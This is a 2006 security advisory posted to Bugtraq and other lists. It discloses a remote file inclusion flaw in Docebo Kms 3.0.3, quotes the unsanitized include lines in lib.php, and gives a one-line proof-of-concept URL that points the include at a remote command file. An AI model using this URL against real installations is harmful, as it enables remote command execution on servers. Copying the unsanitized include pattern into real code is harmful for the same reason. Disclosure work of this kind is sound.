
Date: Fri, 09 Jun 2006 07:11:19 +0200
From: Federico Fazzi <federico@...istici.org>
To: secunia-vuln-report <vuln@...unia.com>,
	securiteam <news@...uriteam.com>, bugtraq@...urityfocus.com
Subject: Docebo Kms 3.0.3, Remote command execution


-----------------------------------------------------
Advisory id: FSA:009

Author:    Federico Fazzi
Date:	   09/06/2006, 7:09
Sinthesis: Docebo Kms 3.0.3, Remote command execution
Type:	   high
Product:   http://www.docebolms.org/
Patch:	   unavailable
-----------------------------------------------------


1) Description:

Error occured in lib.php,

require_once($GLOBALS['where_framework'].'/lib/lib.lang.php');
require_once($GLOBALS['where_framework'].'/lib/lib.template.php');
require_once($GLOBALS['where_framework'].'/lib/lib.mimetype.php');
require_once($GLOBALS['where_framework'].'/lib/lib.utils.php');

The users can include a remote file because
the $GLOBALS['where_framework'] isn't sanitized

2) Proof of concept:

http://example/[dc_path]/lib/lib.php?GLOBALS[where_framework]=[cmd_url]

3) Solution:

include file where are declare $GLOBALS[*]


